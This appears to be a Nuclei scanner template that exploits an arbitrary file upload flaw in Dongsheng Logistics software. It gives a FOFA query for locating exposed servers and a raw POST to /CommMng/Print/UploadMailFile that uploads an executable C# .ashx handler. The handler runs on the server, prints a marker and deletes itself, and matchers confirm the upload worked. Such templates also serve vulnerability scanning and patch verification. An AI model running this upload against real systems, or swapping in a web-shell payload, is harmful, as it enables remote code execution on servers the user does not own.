id: dongshengsoft-UploadMailFile-fileupload
info:
  name: 东胜物流 UploadMailFile 任意文件上传
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%20CommMngPrintUploadMailFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.txt
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="js/dhtmlxcombo_whp.js" && body="login.aspx"
    hunter-query: demo
    tips:
    repair: 目前官方已发布漏洞修复版本，建议用户升级到安全版本 http://www.dongshengsoft.com/
    version:
  tags: fileupload,dongshengsoft

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /CommMng/Print/UploadMailFile HTTP/1.1
        Host: 
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Length: 234

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="LoadFile"; filename="{{filename}}.ashx"
        Content-Type: application/octet-stream

        <%@ WebHandler Language="C#" Class="x"%>using System.Web;using System.IO;public class x:System.Web.IHttpHandler{public void ProcessRequest(HttpContext c){c.Response.Write("{{randstr}}");File.Delete(c.Request.PhysicalPath);}public bool IsReusable{get{return false;}}}

        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body_1,'success','Message','data')
        condition: and